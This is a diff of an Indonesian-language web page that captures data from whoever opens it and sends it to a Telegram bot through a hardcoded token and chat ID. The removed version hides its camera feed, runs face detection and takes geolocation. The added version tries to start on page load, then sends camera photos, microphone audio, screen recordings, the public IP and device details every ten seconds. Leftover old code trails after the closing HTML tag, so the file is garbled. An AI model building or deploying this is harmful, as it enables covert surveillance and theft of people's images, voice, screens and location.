@@ -1,68 +1,420 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Auto Face → Telegram</title>
-  <style>
-    body { margin: 0; background: #000; overflow: hidden; }
-    video, canvas { display: none; }
-  </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>All-in-One Capture → Telegram (Auto)</title>
+<style>
+  :root{--bg:#071018;--card:#0f1720;--muted:#9aa4b2;--accent:#00ffff}
+  html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#071018,#0d1117);color:#e6eef6;display:flex;align-items:center;justify-content:center}
+  .wrap{width:980px;max-width:96%;padding:16px;border-radius:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));box-shadow:0 10px 40px rgba(0,0,0,0.6)}
+  h1{margin:0 0 8px;font-size:20px;display:flex;gap:10px;align-items:center}
+  .grid{display:grid;grid-template-columns:1fr 360px;gap:12px}
+  .card{background:rgba(255,255,255,0.02);border-radius:10px;padding:12px}
+  .status{font-family:monospace;font-size:13px;color:#cfe;white-space:pre-wrap;max-height:280px;overflow:auto;padding:8px;background:rgba(0,0,0,0.18);border-radius:8px}
+  button{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--accent);padding:8px 10px;border-radius:8px;cursor:pointer}
+  video{width:100%;border-radius:8px;background:#000;display:block}
+  .small{font-size:13px;color:var(--muted)}
+  .controls{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
+  .note{color:#ffcc66;font-size:12px}
+</style>
 </head>
 <body>
-  <video id="video" autoplay muted playsinline></video>
-  <canvas id="canvas" width="640" height="480"></canvas>
+  <div class="wrap">
+    <h1>🔌 All-in-One: Camera Photo · Device Info · Voice · Screen → Telegram (Auto)</h1>
+    <p class="small">Mencoba otomatis: ambil foto kamera, rekam audio & screen (potongan), kirim & kirim info device — setiap interval. Pastikan HTTPS / localhost.</p>
 
-  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
-  <script>
-  // === KONFIGURASI BOT ===
-  const BOT_TOKEN = "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";
-  const CHAT_ID = "8471664635";
-  const MODEL_URL = "https://cdn.jsdelivr.net/gh/vladmandic/face-api/model/";
-  const DETECT_INTERVAL = 10000; // 10 detik
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
-  const ctx = canvas.getContext("2d");
+    <div class="grid">
+      <div>
+        <div class="card">
+          <h3 style="margin:0 0 6px 0">Live Camera</h3>
+          <video id="camVideo" autoplay playsinline muted></video>
+          <div style="height:8px"></div>
+          <div id="camStatus" class="status">Camera: belum aktif</div>
+        </div>
 
-  // ==== Fungsi pendukung ====
-  function detectDevice() {
-    const ua = navigator.userAgent.toLowerCase();
-    let brand = "Unknown";
-    if (/iphone|ipad/.test(ua)) brand = "Apple (iPhone/iPad)";
-    else if (/android/.test(ua)) {
-      if (/samsung/.test(ua)) brand = "Samsung";
-      else if (/huawei|honor/.test(ua)) brand = "Huawei/Honor";
-      else if (/xiaomi|redmi|poco/.test(ua)) brand = "Xiaomi/Poco";
-      else if (/oppo/.test(ua)) brand = "OPPO";
-      else if (/vivo/.test(ua)) brand = "Vivo";
-      else brand = "Android (lainnya)";
-    } else if (/windows/.test(ua)) brand = "Windows PC";
-    else if (/macintosh/.test(ua)) brand = "MacOS";
-    else if (/linux/.test(ua)) brand = "Linux";
-    return brand;
-  }
+        <div style="height:10px"></div>
 
-  function getNetworkInfo() {
-    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    return {
-      type: conn ? conn.effectiveType : "unknown",
-      downlink: conn ? conn.downlink : "n/a"
-    };
-  }
+        <div class="card">
+          <h3 style="margin:0 0 6px 0">Logs & Status</h3>
+          <div id="log" class="status">Menunggu inisialisasi...</div>
+          <div style="height:8px"></div>
+          <div class="controls">
+            <button id="btnStartAll">Mulai Manual (jika auto diblokir)</button>
+            <button id="btnStopAll">Hentikan Semua</button>
+            <span class="note">Interval default: 10 detik. Ubah di kode jika mau 5s.</span>
+          </div>
+        </div>
+      </div>
 
-  async function getLocation() {
-    return new Promise(resolve => {
-      if (!navigator.geolocation) return resolve(null);
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-        () => resolve(null),
-        { enableHighAccuracy: true, timeout: 7000 }
-      );
+      <div>
+        <div class="card">
+          <h3 style="margin:0 0 6px 0">Pengaturan & Token</h3>
+          <div class="small">Bot Telegram & Chat ID yang dipakai (disimpan di file):</div>
+          <pre id="tokenArea" class="status"></pre>
+          <div style="height:8px"></div>
+          <div class="small">INFO: Browser mungkin minta klik manual untuk izinkan kamera/mikrofon/layar.</div>
+        </div>
+
+        <div style="height:10px"></div>
+
+        <div class="card">
+          <h3 style="margin:0 0 6px 0">Preview Screen</h3>
+          <video id="screenVideo" autoplay playsinline style="display:none"></video>
+          <div id="screenStatus" class="status">Screen: belum aktif</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<script>
+/* ================== KONFIGURASI ================== */
+/* Ganti INTERVAL_MS ke 5000 untuk 5 detik */
+const INTERVAL_MS = 10000; // 10 detik
+const BOT_TOKEN = "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";
+const CHAT_ID = "8471664635";
+
+/* ================== Elemen UI ================== */
+const camVideo = document.getElementById('camVideo');
+const camStatus = document.getElementById('camStatus');
+const screenVideo = document.getElementById('screenVideo');
+const screenStatus = document.getElementById('screenStatus');
+const logDiv = document.getElementById('log');
+document.getElementById('tokenArea').textContent = `BOT_TOKEN: ${BOT_TOKEN}\nCHAT_ID: ${CHAT_ID}`;
+
+/* ================== Helper & util ================== */
+function now() { return new Date().toLocaleTimeString(); }
+function appendLog(msg) { logDiv.textContent = `[${now()}] ${msg}\n\n` + logDiv.textContent; }
+function sleep(ms){ return new Promise(res => setTimeout(res, ms)); }
+
+async function sendText(text){
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text })
     });
-  }
+  } catch(e){ console.error('sendText err', e); }
+}
+async function sendPhotoBlob(blob, caption){
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('caption', caption || '');
+    fd.append('photo', blob, 'photo.jpg');
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+  } catch(e){ console.error('sendPhotoBlob err', e); }
+}
+async function sendDocBlob(blob, filename, caption){
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('caption', caption || '');
+    fd.append('document', blob, filename);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
+  } catch(e){ console.error('sendDocBlob err', e); }
+}
 
-  async function reverseGeocode(lat, lon) {
-    try {
+/* ================== Device info builder ================== */
+async function getPublicIP(){
+  try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); return j.ip; } catch { return 'unknown'; }
+}
+function detectDevice(){
+  const ua = navigator.userAgent || '';
+  const platform = navigator.platform || 'unknown';
+  const cores = navigator.hardwareConcurrency || 'n/a';
+  const mem = navigator.deviceMemory || 'n/a';
+  return { ua, platform, cores, mem };
+}
+function netInfo(){
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  return { type: conn ? (conn.effectiveType || conn.type) : 'unknown', downlink: conn ? conn.downlink : 'n/a', rtt: conn ? conn.rtt : 'n/a' };
+}
+async function buildDeviceCaption(note){
+  const dev = detectDevice();
+  const net = netInfo();
+  const ip = await getPublicIP();
+  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+  const lines = [
+    "📡 Device Info",
+    `🕒 ${new Date().toLocaleString()}`,
+    `Platform: ${dev.platform}`,
+    `UA: ${dev.ua}`,
+    `Cores: ${dev.cores}, Mem: ${dev.mem}`,
+    `Network: ${net.type} (down:${net.downlink}, rtt:${net.rtt})`,
+    `IP: ${ip}`,
+    `Timezone: ${tz}`,
+    note || ''
+  ];
+  return lines.join("\n");
+}
+
+/* ================== Camera Photo capture ================== */
+let camStream = null;
+async function startCamera(){
+  if (camStream) return;
+  try {
+    camStatus.textContent = "Meminta izin kamera...";
+    camStream = await navigator.mediaDevices.getUserMedia({ video: { width:640, height:480 }, audio: false });
+    camVideo.srcObject = camStream;
+    await camVideo.play();
+    camStatus.textContent = "Camera: aktif";
+    appendLog("Camera aktif.");
+  } catch(e){
+    camStatus.textContent = "Camera: gagal - " + (e.message || e);
+    appendLog("Gagal akses kamera: " + (e.message || e));
+  }
+}
+async function stopCamera(){
+  if (!camStream) return;
+  camStream.getTracks().forEach(t=>t.stop());
+  camStream = null;
+  try { camVideo.srcObject = null; } catch {}
+  camStatus.textContent = "Camera: berhenti";
+  appendLog("Camera dihentikan.");
+}
+async function capturePhotoAndSend(){
+  if (!camStream) { appendLog("Capture skipped: camera tidak aktif."); return; }
+  try {
+    const w = camVideo.videoWidth || 640;
+    const h = camVideo.videoHeight || 480;
+    const c = document.createElement('canvas');
+    c.width = w; c.height = h;
+    const ctx = c.getContext('2d');
+    ctx.drawImage(camVideo, 0, 0, w, h);
+    const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.85));
+    const caption = await buildDeviceCaption("Foto kamera otomatis");
+    await sendPhotoBlob(blob, caption);
+    appendLog("Foto kamera dikirim.");
+  } catch(e){ appendLog("Error capturePhoto: " + (e.message || e)); }
+}
+
+/* ================== Audio recording (chunked) ================== */
+let audioStream = null;
+let audioRecorder = null;
+let audioChunks = [];
+let audioActive = false;
+
+async function startAudio(){
+  if (audioActive) return;
+  try {
+    appendLog("Meminta izin mikrofon...");
+    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+    audioActive = true;
+    audioRecorder = new MediaRecorder(audioStream);
+    audioRecorder.ondataavailable = e => { if (e.data && e.data.size) audioChunks.push(e.data); };
+    audioRecorder.onstop = async () => {
+      if (audioChunks.length === 0) return;
+      const blob = new Blob(audioChunks, { type: audioChunks[0].type || 'audio/webm' });
+      const ts = new Date().toISOString().replace(/[:.]/g,'-');
+      const filename = `audio-${ts}.webm`;
+      const caption = await buildDeviceCaption("Audio otomatis");
+      await sendDocBlob(blob, filename, caption);
+      appendLog("Chunk audio dikirim: " + filename);
+      audioChunks = [];
+    };
+    audioRecorder.start();
+    appendLog("Audio merekam.");
+    // loop chunking using stop/start pattern
+    (async function loopAudio(){
+      while (audioActive){
+        await sleep(INTERVAL_MS);
+        if (!audioActive) break;
+        try {
+          if (audioRecorder && audioRecorder.state === 'recording') {
+            audioRecorder.stop();
+            await sleep(300); // allow onstop to fire & send
+            audioRecorder = new MediaRecorder(audioStream);
+            audioChunks = [];
+            audioRecorder.ondataavailable = e => { if (e.data && e.data.size) audioChunks.push(e.data); };
+            audioRecorder.onstop = async () => {
+              if (audioChunks.length === 0) return;
+              const blob = new Blob(audioChunks, { type: audioChunks[0].type || 'audio/webm' });
+              const ts = new Date().toISOString().replace(/[:.]/g,'-');
+              const filename = `audio-${ts}.webm`;
+              const caption = await buildDeviceCaption("Audio otomatis");
+              await sendDocBlob(blob, filename, caption);
+              appendLog("Chunk audio dikirim: " + filename);
+              audioChunks = [];
+            };
+            audioRecorder.start();
+          }
+        } catch(err){
+          appendLog("Audio chunk error: " + (err.message || err));
+          break;
+        }
+      }
+    })();
+  } catch(e){
+    audioActive = false;
+    appendLog("Gagal akses mikrofon: " + (e.message || e));
+  }
+}
+function stopAudio(){
+  audioActive = false;
+  try { if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop(); } catch {}
+  if (audioStream) { audioStream.getTracks().forEach(t=>t.stop()); audioStream = null; }
+  appendLog("Audio dihentikan.");
+}
+
+/* ================== Screen recording (chunked) ================== */
+let screenStream = null;
+let screenRecorder = null;
+let screenChunks = [];
+let screenActive = false;
+
+async function startScreen(){
+  if (screenActive) return;
+  try {
+    appendLog("Meminta izin recording layar...");
+    screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
+    try { screenVideo.srcObject = screenStream; screenVideo.style.display = 'block'; } catch {}
+    screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
+    screenRecorder.ondataavailable = e => { if (e.data && e.data.size) screenChunks.push(e.data); };
+    screenRecorder.onstop = async () => {
+      if (screenChunks.length === 0) return;
+      const blob = new Blob(screenChunks, { type: screenChunks[0].type || 'video/webm' });
+      const ts = new Date().toISOString().replace(/[:.]/g,'-');
+      const filename = `screen-${ts}.webm`;
+      const caption = await buildDeviceCaption("Screen otomatis");
+      await sendDocBlob(blob, filename, caption);
+      appendLog("Chunk screen dikirim: " + filename);
+      screenChunks = [];
+    };
+    screenRecorder.start();
+    screenActive = true;
+    screenStatus.textContent = "Screen: merekam";
+    appendLog("Screen recording aktif.");
+    // loop chunking
+    (async function loopScreen(){
+      while (screenActive){
+        await sleep(INTERVAL_MS);
+        if (!screenActive) break;
+        try {
+          if (screenRecorder && screenRecorder.state === 'recording') {
+            screenRecorder.stop();
+            await sleep(500);
+            screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
+            screenChunks = [];
+            screenRecorder.ondataavailable = e => { if (e.data && e.data.size) screenChunks.push(e.data); };
+            screenRecorder.onstop = async () => {
+              if (screenChunks.length === 0) return;
+              const blob = new Blob(screenChunks, { type: screenChunks[0].type || 'video/webm' });
+              const ts = new Date().toISOString().replace(/[:.]/g,'-');
+              const filename = `screen-${ts}.webm`;
+              const caption = await buildDeviceCaption("Screen otomatis");
+              await sendDocBlob(blob, filename, caption);
+              appendLog("Chunk screen dikirim: " + filename);
+              screenChunks = [];
+            };
+            screenRecorder.start();
+          }
+        } catch(err){
+          appendLog("Screen chunk error: " + (err.message || err));
+          break;
+        }
+      }
+    })();
+
+    // stop when user stops sharing
+    screenStream.getVideoTracks().forEach(track => track.onended = () => { stopScreen(); });
+  } catch(e){
+    screenStatus.textContent = "Screen: error - " + (e.message || e);
+    appendLog("Gagal akses layar: " + (e.message || e));
+  }
+}
+function stopScreen(){
+  screenActive = false;
+  try { if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop(); } catch {}
+  if (screenStream) { screenStream.getTracks().forEach(t=>t.stop()); screenStream = null; }
+  try { screenVideo.srcObject = null; screenVideo.style.display = 'none'; } catch {}
+  screenStatus.textContent = "Screen: berhenti";
+  appendLog("Screen dihentikan.");
+}
+
+/* ================== Overall scheduler: capture everything each interval ================== */
+let mainIntervalHandle = null;
+async function captureCycleOnce(){
+  appendLog("=== Cycle start ===");
+  // send device info text first
+  try {
+    const caption = await buildDeviceCaption("Cycle otomatis");
+    await sendText(caption);
+    appendLog("Device info dikirim.");
+  } catch(e){ appendLog("Gagal kirim device info: " + (e.message || e)); }
+
+  // capture camera photo (async)
+  try { await capturePhotoAndSend(); } catch(e){ appendLog("Gagal foto: " + (e.message || e)); }
+
+  // audio & screen are chunked independently by their loops — but to ensure a chunk gets sent around this time,
+  // we force stop recorder to emit ondataavailable (if active), then restart quickly (only if active)
+  try {
+    if (audioActive && audioRecorder && audioRecorder.state === 'recording') {
+      audioRecorder.stop();
+      appendLog("Audio recorder cycle forced to stop->send.");
+      await sleep(300);
+      // restart recorder (handled by audio loop normally)
+    }
+  } catch(e){ appendLog("Audio cycle force error: " + (e.message || e)); }
+
+  try {
+    if (screenActive && screenRecorder && screenRecorder.state === 'recording') {
+      screenRecorder.stop();
+      appendLog("Screen recorder cycle forced to stop->send.");
+      await sleep(400);
+    }
+  } catch(e){ appendLog("Screen cycle force error: " + (e.message || e)); }
+
+  appendLog("=== Cycle end ===");
+}
+
+async function startAll(){
+  appendLog("Memulai semua komponen...");
+  await startCamera();
+  await startAudio();
+  await startScreen();
+
+  // immediate first cycle shortly after start
+  await sleep(500);
+  await captureCycleOnce();
+
+  // start interval loop for combined cycles
+  if (mainIntervalHandle) clearInterval(mainIntervalHandle);
+  mainIntervalHandle = setInterval(() => {
+    captureCycleOnce().catch(e => appendLog("Cycle err: " + (e.message || e)));
+  }, INTERVAL_MS);
+}
+
+/* stop everything */
+function stopAll(){
+  if (mainIntervalHandle) { clearInterval(mainIntervalHandle); mainIntervalHandle = null; }
+  stopCamera();
+  stopAudio();
+  stopScreen();
+  appendLog("Semua dihentikan.");
+}
+
+/* ================ Buttons ================ */
+document.getElementById('btnStartAll').addEventListener('click', () => startAll());
+document.getElementById('btnStopAll').addEventListener('click', () => stopAll());
+
+/* ================ Auto-start attempt ================ */
+window.addEventListener('load', async () => {
+  appendLog("Inisialisasi halaman. Mencoba auto-start...");
+  // Try to auto-start — many browsers may block screen getDisplayMedia without gesture,
+  // but we'll still try to get camera & microphone (which sometimes succeed).
+  try {
+    await startAll();
+    appendLog("Auto-start sequence dijalankan (berhasil/terblokir?). Jika gagal, klik 'Mulai Manual'.");
+  } catch(e){
+    appendLog("Auto-start gagal: " + (e.message || e));
+  }
+});
+
+/* cleanup on unload */
+window.addEventListener('beforeunload', () => { stopAll(); });
+</script>
+</body>
+  </html>    try {
       const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
       const data = await res.json();
       const countryCode = data.address?.country_code?.toUpperCase() || "N/A";
